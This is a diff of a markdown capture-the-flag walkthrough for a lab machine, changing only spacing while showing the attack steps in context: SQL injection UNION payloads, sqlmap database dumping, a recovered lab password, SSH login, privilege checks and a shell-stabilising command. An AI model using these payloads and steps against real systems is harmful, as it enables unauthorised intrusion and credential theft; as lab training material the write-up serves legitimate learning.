@@ -74,6 +74,7 @@ union select 1,2,3,4,5
 ![image10](../resources/d7a3af7b686c4cb7878bd5940a5c5ca5.png)
 
 - 2 and 4 are being reflected so:
+  
 ```bash
 union select 1,database(),3,version(),5
 
@@ -110,6 +111,7 @@ union select 1,database(),3,version(),5
 ![image15](../resources/e203c5678a324f6f9d0ff7cfaf21b647.png)
 
 - Run SQLMap:
+
 ```bash
 sqlmap -r burp --batch
 
@@ -119,6 +121,7 @@ sqlmap -r burp --batch
 ![image16](../resources/b522cbfca79e43ff8d559b8bf7b8c3be.png)
 
 - Or just dump the database (more noisy):
+
 ```bash
 sqlmap -r burp --batch --dump
 
@@ -132,6 +135,7 @@ sqlmap -r burp --batch --dump
 **Dennis : ih8dinos**
 
 - SSH with the credentials:
+  
 ```bash
 ssh dennis@10.10.204.254
 
@@ -160,13 +164,15 @@ sudo -l
 ![image22](../resources/1b6e1e41bc804d6d9db55a4f46f4e11e.png)
 
 - Stabilise:
+  
 ```python
 python -c 'import pty; pty.spawn("/bin/bash")'
 ```
 
 ![image23](../resources/0196f74cfb104313b16a28f7840ebe7f.png)
 
-- Search for flags
+- Search for flags:
+  
 ```bash
 find / -name "flag\*" 2>/dev/null
 
